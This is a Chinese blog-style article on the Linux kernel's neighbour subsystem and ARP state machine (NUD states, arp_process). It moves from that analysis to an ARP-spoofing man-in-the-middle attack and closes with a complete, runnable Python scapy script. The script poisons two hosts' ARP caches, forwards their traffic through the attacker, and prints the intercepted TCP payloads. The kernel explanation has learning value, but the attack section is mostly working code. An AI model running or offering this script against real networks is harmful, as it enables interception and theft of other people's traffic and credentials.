# 邻居子系统与ARP协议

邻居子系统的作用就是将IP地址，转换为MAC地址，类似操作系统中的MMU（内存管理单元），将虚拟地址，转换为物理地址。

其中邻居子系统相当于地址解析协议（IPv4的ARP协议，IPv6的ND(Neighbor discover)协议）的一个通用抽象，可以在其上实现ARP等各种地址解析协议

# 邻居子系统的数据结构

```c
struct neighbour{
....................
}
```

neighbour结构存储的是IP地址与MAC地址的对应关系，当前状态

```c
struct neighbour_table{
....................
}
```

每一个地址解析协议对应一个neighbour_table,我们可以查看ARP的初始函数arp_init，其会创建arp_tbl

neighbour_table 包含 neighbour

# 邻居子系统的状态转换 

其状态信息是存放在neighbour结构的nud_state字段的

可以分析neigh_update与neigh_timer_handler函数，来理解他们之间的转换关系。


NUD_NONE:

    表示刚刚调用neigh_alloc创建neighbour

NUD_IMCOMPLETE

    发送一个请求，但是还未收到响应。如果经过一段时间后，还是没有收到响应，则查看发送请求数是否超过上限，如果超过则转到NUD_FAILED,否则继续发送请求。如果接受到响应则转到NUD_REACHABLE

NUD_REACHABLE:

    表示目标可达。如果经过一段时间，未有到达目标的数据包，则转为NUD_STALE状态

NUD_STALE

    在此状态，如果有用户准备发送数据，则切换到NUD_DELAY状态
    
NUD_DELAY

    该状态会启动一个定时器，然后接受可到达确认，如果定时器过期之前，收到可到达确认，则将状态切换到NUD_REACHABLE,否则转换到NUD_PROBE状态。

NUD_PROBE

    类似NUD_IMCOMPLETE状态

NUD_FAILED

    不可达状态，准备删除该neighbour

各种状态之间的切换，也可以通过scapy构造数据包发送并通过Linux 下的 ip neigh show 命令查看

# ARP接收处理函数分析

ARP的接收处理函数为arp_process(位于net/ipv4/arp.c)中

我们分情况讨论arp_process的处理函数并结合scapy发包来分析处理过程

##### 当为ARP请求数据包，且能找到到目的地址的路由

如果不是发送到本机的ARP请求数据包，则看是否需要进行代理ARP处理

如果是发送到本机的ARP请求数据包，则分neighbour的状态进行讨论，但是通过分析发现，不论当前neighbour是处于何种状态（NUD_FAILD、NUD_NONE除外），则都会将状态切换成 NUD_STALE状态，且mac地址不相同时，则会切换到本次发送方的mac地址

##### 当为ARP请求数据包，不能找到到目的地址的路由

不做任何处理

##### 当为ARP响应数据包

如果没有对应的neighbour，则不做任何处理。如果该neighbour存在，则将状态切换为NUD_REACHABLE，MAC地址更换为本次发送方的地址

# 中间人攻击原理

通过以上分析，可以向受害主机A发送ARP请求数据包，其中请求包中将源IP地址，设置成为受害主机B的IP地址，这样，就会将主机A中的B的 MAC缓存，切换为我们的MAC地址。

同理，向B中发送ARP请求包，其中源IP地址为A的地址

然后，我们进行ARP数据包与IP数据包的中转，从而达到中间人攻击。

# 使用Python scapy包，实现中间人攻击：

##### 环境

python3

ubuntu 14.04

VMware 虚拟专用网络

##### 代码

```python
#!/usr/bin/python3

from scapy.all import *
import threading
import time

client_ip = "192.168.222.186"
client_mac = "00:0c:29:98:cd:05"

server_ip = "192.168.222.185"
server_mac = "00:0c:29:26:32:aa"

my_ip = "192.168.222.187"
my_mac = "00:0c:29:e5:f1:21"

def packet_handle(packet):
    if packet.haslayer("ARP"):
        if packet.pdst == client_ip or packet.pdst == server_ip:
            if packet.op == 1: # request
                if packet.pdst == client_ip:
                    pkt = Ether(dst=client_mac,src=my_mac)/ARP(op=1,pdst=packet.pdst,psrc=packet.psrc)
                    sendp(pkt)
                if packet.pdst == server_ip:
                    pkt = Ether(dst=server_mac,src=my_mac)/ARP(op=1,pdst=packet.pdst,psrc=packet.psrc)
                    sendp(pkt)

                pkt = Ether(dst=packet.src)/ARP(op=2,pdst=packet.psrc,psrc=packet.pdst) #reply
                sendp(pkt)
            if packet.op == 2: #reply
                if packet.pdst == client_ip:
                    pkt = Ether(dst=client_mac,src=my_mac)/ARP(op=2,pdst=packet.pdst,psrc=packet.psrc)
                    sendp(pkt)
                if packet.pdst == server_ip:
                    pkt = Ether(dst=server_mac,src=my_mac)/ARP(op=2,pdst=packet.pdst,psrc=packet.psrc)
                    sendp(pkt)
                

    if packet.haslayer("IP"):
        if packet[IP].dst == client_ip or packet[IP].dst == server_ip:
            if packet[IP].dst == client_ip:
                packet[Ether].dst=client_mac
            if packet[IP].dst == server_ip:
                packet[Ether].dst=server_mac
            packet[Ether].src = my_mac
            sendp(packet)
        if packet.haslayer("TCP"):
            print(packet[TCP].payload)
            
class SniffThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
    def run(self):
        sniff(prn = packet_handle,count=0)

class PoisoningThread(threading.Thread):
    __src_ip = ""
    __dst_ip = ""
    __mac = ""
    def __init__(self,dst_ip,src_ip,mac):
        threading.Thread.__init__(self)
        self.__src_ip = src_ip
        self.__dst_ip = dst_ip
        self.__mac = mac

    def run(self):
        pkt = Ether(dst=self.__mac)/ARP(pdst=self.__dst_ip,psrc=self.__src_ip)
        srp1(pkt)
        print("poisoning thread exit")

if __name__ == "__main__":
    my_sniff = SniffThread()
    client = PoisoningThread(client_ip,server_ip,client_mac)
    server = PoisoningThread(server_ip,client_ip,server_mac)

    client.start()
    server.start()
    my_sniff.start()

    client.join()
    server.join()
    my_sniff.join()

```

client_ip 为发送数据的IP

server_ip 为接收数据的IP

    
# 参考质料

Linux邻居协议 学习笔记 之五 通用邻居项的状态机机制

https://blog.csdn.net/lickylin/article/details/22228047